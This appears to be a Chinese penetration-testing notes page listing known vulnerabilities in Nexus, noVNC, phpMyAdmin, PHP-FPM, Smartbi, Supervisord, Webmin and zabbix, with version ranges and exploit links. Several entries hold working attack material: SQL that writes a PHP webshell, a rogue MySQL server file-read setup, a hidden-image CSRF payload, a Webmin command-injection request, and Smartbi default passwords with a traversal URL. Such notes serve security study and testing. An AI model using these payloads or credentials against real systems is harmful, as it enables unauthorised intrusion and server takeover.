    Nexus Repository Manager 3 是一款软件仓库,可以用来存储和分发 Maven、NuGET 等软件源仓库.其 3.14.0 及之前版本中,存在一处基于 OrientDB 自定义函数的任意 JEXL 表达式执行功能,而这处功能存在未授权访问漏洞,将可以导致任意命令执行漏洞.

- 影响版本
    - nexus < 3.15.0

- 文章
    - [一次偶遇Nexus](https://www.secpulse.com/archives/111818.html)
    - [Nexus Repository Manager 3 远程命令执行漏洞 (CVE-2019-7238) ](https://vulhub.org/#/environments/nexus/CVE-2019-7238/)

- POC | Payload | exp
    - [mpgn/CVE-2019-7238](https://github.com/mpgn/CVE-2019-7238)
    - [jas502n/CVE-2019-7238](https://github.com/jas502n/CVE-2019-7238)

**CVE-2020-10199/CVE-2020-10204**
- 文章
    - [Nexus Repository Manager(CVE-2020-10199/10204)漏洞分析及回显利用方法的简单讨论](https://www.cnblogs.com/magic-zero/p/12641068.html)

- POC | Payload | exp
    - [aleenzz/CVE-2020-10199](https://github.com/aleenzz/CVE-2020-10199)

---

## noVNC

> 官网 : https://novnc.com

**CVE-2017-18635 xss**
- 简介

    noVNC 是一款 HTML VNC（Virtual Network Computing）客户端库。 noVNC 0.6.2之前版本中存在跨站脚本漏洞。该漏洞源于 WEB 应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。

- 影响版本
    - novnc < 0.6.2

- 文章
    - [Exploiting an old noVNC XSS (CVE-2017-18635) in OpenStack](https://www.shielder.it/blog/exploiting-an-old-novnc-xss-cve-2017-18635-in-openstack/)

- POC | Payload | exp
    - [ShielderSec/cve-2017-18635](https://github.com/ShielderSec/cve-2017-18635)

---

## phpMyAdmin

> 官网: https://www.phpmyadmin.net/

**搭建教程**
- [phpMyAdmin 搭建](../../../../运维/Linux/Power-Linux.md#phpMyAdmin)

**文章**
- [phpMyadmin各版本漏洞](https://www.cnblogs.com/xishaonian/p/7627125.html) - 2/3 老版本的漏洞

**通过 phpmyadmin 来 getshell**
- 确认绝对路径

    利用 log 变量,猜绝对路径

    ![](../../../../../assets/img/安全/笔记/RedTeam/后渗透/权限提升/1.png)

    或者直接查询 `select @@basedir;`

    直接 SQL 写文件 `select '<?php phpinfo(); ?>' INTO OUTFILE 'C:/phpStudy/PHPTutorial/WWW/a.php';`

    如果 file_priv 为 null,那么是写不了的,可以尝试使用日志写马
    ```sql
    set global general_log='on';
    set global general_log_file='C:/phpStudy/PHPTutorial/WWW/a.php';
    select '<?php phpinfo(); ?>';
    set global general_log=off;
    ```
    参考 : [phpMyAdmin新姿势getshell](https://zhuanlan.zhihu.com/p/25957366)

**CVE-2016-5734 4.0.x—4.6.2 远程代码执行漏洞**
- 简介

    phpMyAdmin 中存在安全漏洞，该漏洞源于程序没有正确选择分隔符来避免使用 preg_replacee 修饰符。远程攻击者可借助特制的字符串利用该漏洞执行任意 PHP 代码。以下版本受到影响：phpMyAdmin4.0.10.16之前4.0.x版本，4.4.15.7之前4.4.x版本，4.6.3之前4.6.x版本。

- 影响版本
    - phpmyadmin 4.0.0 ~ 4.0.10.15
    - phpmyadmin 4.4.0 ~ 4.4.15.6
    - phpmyadmin 4.6.0 ~ 4.6.2

- POC | Payload | exp
    - [phpMyAdmin 4.6.2 - (Authenticated) Remote Code Execution](https://www.exploit-db.com/exploits/40185)

**LOAD DATA INFILE 任意文件读取漏洞**
- POC | Payload | exp
    [Gifts/Rogue-MySql-Server](https://github.com/Gifts/Rogue-MySql-Server)
    ```vim
    vim rogue_mysql_server.py

    PORT = 3307
    ```
    `python rogue_mysql_server.py`

    打开目标 phpMyAdmin 的登录页面,地址输入 db:3307、用户名、密码,提交登录.

    回到 db 的终端,如果文件读取成功会将文件内容记录到 mysql.log 文件中

**phpMyAdmin 4.7.x CSRF**
- 文章
    - [phpMyAdmin 4.7.x CSRF 漏洞利用](https://blog.vulnspy.com/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/)

**4.8.x 本地文件包含漏洞利用**
- 文章
    - [phpMyAdmin 4.8.x 本地文件包含漏洞利用 | Vulnspy Blog](http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/) 可以通过这个线上靶场实验,不过 docker 镜像可能有点问题,mysql 进程起不起来,我的解决方式是直接卸了重装 mysql-server,而且他默认的 apt 源无法访问,还要换一下 apt 源

**phpmyadmin4.8.1 后台 getshell**
- 文章
    - [phpmyadmin4.8.1后台getshell](https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog)

**CVE-2019-12922 4.9.0.1 CSRF**
- 简介

    phpMyAdmin 4.9.0.1 版本中存在跨站请求伪造漏洞。该漏洞源于 WEB 应用未充分验证请求是否来自可信用户。攻击者可利用该漏洞通过受影响客户端向服务器发送非预期的请求。

- 影响版本
    - phpmyadmin 4.9.0.1

- POC | Payload | exp

    - `<img src=" http://server/phpmyadmin/setup/index.php?page=servers&mode=remove&id=1" style="display:none;" />`
    - https://www.hedysx.com/bug/2398.html

---

## PHP-FPM

PHP-FPM 是一个 PHPFastCGI 管理器，对于 PHP 5.3.3 之前的 php 来说，是一个补丁包 ，旨在将 FastCGI 进程管理整合进 PHP 包中。

**PHP-FPM Fastcgi 未授权访问漏洞**
- 文章
    - [Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)

- POC | Payload | exp
    - https://vulhub.org/#/environments/fpm/
    - [phith0n/fpm.py](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75)

---

## Smartbi

**常见口令**
- demo/demo
- manager/demo
- admin/admin
- admin/manager
- admin/2manager

**Tips**
- http://127.0.0.1:18080/smartbi/vision/config.jsp 可能未修改密码或者密码为 manager
- http://127.0.0.1:18080/smartbi/vision/chooser.jsp?key=CONFIG_FILE_DIR&root=C%3A%2F 进入后台目录遍历

---

## Supervisord

> 项目地址 : https://github.com/Supervisor/supervisor

**搭建教程**
- [Supervisord 搭建](../../../../运维/Linux/Power-Linux.md#Supervisor)

**测试链接**
- `http://<ip>:9001`

**CVE-2017-11610 Supervisord 远程命令执行漏洞**
- 简介

    supervisor 中的 XML-RPC 服务器允许远程身份验证的用户通过精心编制的与嵌套 supervisord 命名空间查找相关的 XML-RPC 请求执行任意命令。

- 影响版本
    - supervisor < 3.0
    - supervisor 3.1.0 ~ 3.3.2

- 文章
    - [Supervisord远程命令执行漏洞 (CVE-2017-11610) ](https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html)
    - [Supervisord 远程命令执行漏洞 (CVE-2017-11610) ](https://vulhub.org/#/environments/supervisor/CVE-2017-11610/)

---

## Webmin

> 官网 : http://www.webmin.com/

**搭建教程**
- [Webmin 搭建](../../../../运维/Linux/Power-Linux.md#Webmin)

**CVE-2019-15107 Webmin Remote Code Execution**
- 简介

    在其找回密码页面中,存在一处无需权限的命令注入漏洞,通过这个漏洞攻击者即可以执行任意系统命令.

- 影响版本
    - Webmin < 1.920

- 文章
    - [Webmin(CVE-2019-15107) 远程代码执行漏洞之 backdoor 探究](https://zhuanlan.zhihu.com/p/79287037)

- POC | Payload | exp
    - [vulhub/webmin/CVE-2019-15107/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/webmin/CVE-2019-15107/README.zh-cn.md)
    ```
    POST /password_change.cgi HTTP/1.1
    Host: your-ip:10000
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Cookie: redirect=1; testing=1; sid=x; sessiontest=1
    Referer: https://your-ip:10000/session_login.cgi
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 60

    user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
    ```

**CVE-2019-15642 Webmin Remote Code Execution**
- 简介

    Webmin 到 1.920 中的 rpc.cgi 允许通过精心设计的对象名称进行经过身份验证的远程代码执行，因为 unserialise_variable 进行了 eval 调用。注意：Webmin_Servers_Index 文档指出“ RPC 可用于运行任何命令或修改服务器上的任何文件，这就是为什么不得将它的访问权限授予不可信的 Webmin 用户的原因。”

- 影响版本
    - Webmin < 1.920

- POC | Payload | exp
    - [jas502n/CVE-2019-15642](https://github.com/jas502n/CVE-2019-15642)

---

## zabbix

> 官网 : https://www.zabbix.com

zabbix 是一款服务器监控软件,其由 server、agent、web 等模块组成,其中 web 模块由 PHP 编写,用来显示数据库中的结果.

**搭建教程**
- [zabbix 搭建](../../../../运维/Linux/Power-Linux.md#zabbix)

**CVE-2016-10134 zabbix latest.php SQL 注入漏洞**
- 简介

    Zabbix 的 latest.php 中的 toggle_ids[] 或 jsrpc.php 中的 profieldx2 参数存在 sql 注入，通过 sql 注入获取管理员账户密码，进入后台，进行 getshell 操作。

- 影响版本
    - zabbix < 2.2.13
    - zabbix 3.0.0 ~ 3.0.3

- 文章
    - [zabbix latest.php SQL注入漏洞 (CVE-2016-10134) ](https://vulhub.org/#/environments/zabbix/CVE-2016-10134/)
    - [记一次zabbix安装及漏洞利用getshell全过程](https://xz.aliyun.com/t/6874)
    - [Zabbix sql注入漏洞复现（CVE-2016-10134）](https://mp.weixin.qq.com/s/Gi3NMbZcgMutE8mNqCmNAw)
